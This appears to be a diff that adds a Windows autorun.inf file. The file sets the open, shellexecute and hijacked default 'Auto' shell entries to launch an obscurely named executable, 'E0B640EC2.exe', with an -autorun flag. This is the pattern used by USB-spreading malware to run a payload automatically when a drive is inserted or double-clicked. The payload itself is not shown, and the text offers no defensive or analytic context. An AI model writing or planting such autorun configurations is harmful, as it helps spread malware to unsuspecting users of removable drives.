@@ -1,0 +1,5 @@
+[autorun]
+open=E0B640EC2.exe -autorun
+shellexecute=E0B640EC2.exe -autorun
+shell\Auto\command=E0B640EC2.exe -autorun
+shell=Auto
